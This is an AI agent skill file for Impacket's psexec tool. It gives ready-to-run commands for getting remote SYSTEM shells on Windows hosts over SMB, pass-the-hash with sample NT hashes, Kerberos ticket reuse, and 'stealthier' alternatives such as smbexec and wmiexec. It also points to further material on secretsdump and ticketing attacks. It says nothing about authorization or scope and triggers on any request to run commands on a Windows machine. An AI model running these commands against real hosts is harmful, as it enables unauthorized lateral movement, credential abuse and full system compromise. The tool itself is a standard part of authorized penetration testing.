---
name: psexec
description: "Impacket psexec for remote SYSTEM-level shell execution on Windows hosts via SMB. Use when asked to execute commands remotely on a Windows host, get a SYSTEM shell via SMB, perform pass-the-hash for remote execution, or run commands on a Windows machine using impacket tools."
license: Apache-2.0
compatibility: "Linux, macOS, Windows. Install: pip install impacket or apt install python3-impacket (Kali). Part of the impacket suite."
metadata:
  author: AeonDave
  version: "1.0"
---

# psexec (impacket)

Remote SYSTEM shell via SMB — part of the impacket suite. Creates a service, uploads a remote shell binary to ADMIN$, and executes it.

## Quick Start

```bash
# Password auth
impacket-psexec domain/user:password@192.168.1.10

# Pass-the-hash
impacket-psexec administrator@192.168.1.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# Local account
impacket-psexec WORKGROUP/administrator:password@192.168.1.10
```

## Core Flags

| Flag | Description |
|------|-------------|
| `domain/user:pass@target` | Standard auth string |
| `-hashes <LM:NT>` | Pass-the-hash (use `:NT` for NT only) |
| `-no-pass` | No password (for null sessions) |
| `-k` | Kerberos auth |
| `-dc-ip <ip>` | Domain controller IP |
| `-port <n>` | Custom SMB port |
| `-service-name <n>` | Custom service name (default random) |
| `-remote-binary-name <n>` | Custom remote binary name |
| `-shell-type <type>` | Shell type: `cmd` or `powershell` |
| `-codec <enc>` | Output encoding (default auto-detect) |

## Impacket Execution Alternatives

| Tool | Method | Notes |
|------|--------|-------|
| `psexec.py` | Service + ADMIN$ binary | SYSTEM shell; noisy (creates service) |
| `smbexec.py` | Service + cmd.exe | No binary drop; semi-interactive |
| `wmiexec.py` | WMI + cmd.exe | Semi-interactive; no service created |
| `atexec.py` | Task Scheduler | Single command; no interactive shell |
| `dcomexec.py` | DCOM | Multiple DCOM object options |

## Common Workflows

```bash
# Get SYSTEM shell with credentials
impacket-psexec corp.local/admin:Password123@10.10.10.10

# Pass-the-hash (no LM needed for modern Windows)
impacket-psexec -hashes :f6f38b793db6a78dc379eee9e56b8c91 administrator@10.10.10.10

# PowerShell shell
impacket-psexec admin:pass@10.10.10.10 -shell-type powershell

# Execute single command (use wmiexec for non-interactive)
impacket-wmiexec admin:pass@10.10.10.10 "net user"

# Stealthier: smbexec (no binary to disk)
impacket-smbexec admin:pass@10.10.10.10

# Kerberos auth (with CCACHE)
export KRB5CCNAME=/tmp/admin.ccache
impacket-psexec -k -no-pass corp.local/admin@dc.corp.local
```

## Resources

| File | When to load |
|------|--------------|
| `references/impacket-suite.md` | Full impacket tool reference, secretsdump, GetUserSPNs, ticketing attacks |

## Structuring This Skill
